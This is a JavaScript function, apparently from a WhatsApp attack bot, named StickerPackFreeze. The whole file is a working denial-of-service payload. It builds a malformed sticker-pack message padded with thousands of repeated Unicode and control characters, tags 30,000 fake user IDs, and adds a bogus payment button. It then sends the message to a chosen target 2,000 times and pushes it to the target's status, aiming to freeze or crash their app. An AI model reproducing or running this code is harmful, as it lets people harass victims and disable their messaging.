async function StickerPackFreeze(target) {
  const stickerPack = await generateWAmessageFromContent(target, {
    extendedTextMessage: {
      message: {
        stickerPackMessage: {
          stickerPackId: "642f1c7a-094d-4ea7-82aa-d283952a4322",
          name: 'https://Wa.me/stickerpack/Xyraa4Sx',
          publisher: "Xyraaa4Sx",
          stickers: [
            {
              fileName: "hH9-mjYyzRiKyN89WuVcxbgidYdQeGjBxQeUfz3NVQ4=.webp",
              isAnimated: true,
              emojis: ["💐"],
              accessibilityLabel: 'ꦾ'.repeat(1222),
              isLottie: false,
              mimetype: "image/webp"
            },
            {
              fileName: "jpxNv2Sd1s6fL5-HnkMrNQY3XbN0YLO4th8uwwgl4dA=.webp",
              isAnimated: true,
              emojis: ["💐"],
              accessibilityLabel: 'ꦾ'.repeat(1222),
              isLottie: false,
              mimetype: "image/webp"
            },
            {
              fileName: "RrPMKWCtHlOwjp97mAglUYPIaJWYtVPmndIVDLDX96g=.webp",
              isAnimated: true,
              emojis: ["💐"],
              accessibilityLabel: 'ꦾ'.repeat(1222),
              isLottie: false,
              mimetype: "image/webp"
            }
          ],
          fileLength: 959168,
          fileSha256: "R45kqbx/nwvhGMMqLkD49f1ggQ9anc07PNnmx6TvoNE=",
          fileEncSha256: "iiZJfuiGEdzzsXqOM3gzdFVgpz1MyY0GPMP7UAYGnZI=",
          mediaKey: "GJAqSOkifR6DPqViXuBJ8P3+/NkzhsWH6EEuYTySJ4s=",
          directPath: "/v/t62.15575-24/542959707_546680258506540_609965180471151393_n.enc",
          mediaKeyTimestamp: 1756908899,
          trayIconFileName: "642f1c7a-094d-4ea7-82aa-d283952a4322.png",
          thumbnailDirectPath: "/v/t62.15575-24/542690545_4192380777713097_4091855665882100743_n.enc",
          thumbnailSha256: "yXthaTViH0AaN5zl4KC6nd/MJcIW2TdUPMDeeHsNdSg=",
          thumbnailEncSha256: "UDvv/9QVJLPYZ1VFrAmiD1CEDVZYIHmmxfg/fx8HN6Y=",
          thumbnailHeight: 252,
          thumbnailWidth: 252,
          imageDataHash: "ZDNjZWEwMjk3MGY3MzA5MGE0MzU3YzIwZDI1YmQyYjZlNWNjMGYxZjAwODUzNzYxMTUxN2NiYmI3NDExYTdjZQ==",
          stickerPackSize: 961398,
          stickerPackOrigin: "USER_CREATED"
        },
        contextInfo: {
          isForwarded: true,
          forwardingScore: 9999,
          businessMessageForwardInfo: {
            businessOwnerJid: "6288905301692@s.whatsapp.net",
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [
              target,
              "0@s.whatsapp.net",
              ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
            ]
          },
          quotedMessage: {
            interactiveResponseMessage: {
              body: {
                text: "Xyraa4Sx Is Here?💐",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                buttons: [
                  {
                    name: "payment_method",
                    buttonParamsJson: JSON.stringify({
                      reference_id: null,
                      payment_method: "\u0010".repeat(0x2710),
                      payment_timestamp: null,
                      share_payment_status: true
                    })
                  }
                ],
                messageParamsJson: "{}"
              }
            }
          }
        }
      }
    }
  });

  for (let i = 0; i < 2000; i++) {
    await sock.relayMessage(target, stickerPack.message, {
      additionalNodes: [{ tag: "biz", attrs: { native_flow_name: "payment_method" } }],
      messageId: stickerPack.key.id,
      participant: { jid: target },
      userJid: target
    });
    await new Promise((resolve) => setTimeout(resolve, 1000));
  }
  
  await sock.relayMessage("status@broadcast", stickerPack.message, {
    messageId: stickerPack.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: { native_flow_name: "payment_method" },
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

  console.log(chalk.bold(`Succes Sending StickerFreeze To ${target}`));
}